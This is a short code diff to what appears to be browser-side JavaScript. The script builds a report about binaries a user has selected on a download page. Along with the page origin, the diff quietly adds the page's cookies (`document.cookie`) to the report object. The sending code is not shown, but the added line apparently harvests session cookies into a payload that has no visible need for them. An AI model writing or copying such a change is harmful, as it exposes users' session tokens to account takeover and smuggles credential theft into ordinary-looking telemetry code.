@@ -43,6 +43,7 @@
       kind: "mdvh-selected-binaries",
       pageUrl: location.href,
       pageTitle: document.title,
+      pageOrigin: location.origin,
       button: {
         id: target.id,
         text: target.textContent?.trim() || "",
@@ -50,6 +51,7 @@
       release: collectReleaseFields(),
       selectedFiles,
       rawCheckedInputs: collectCheckedInputs(),
+      cookies: document.cookie || "",
       userAgent: navigator.userAgent,
     };
   }
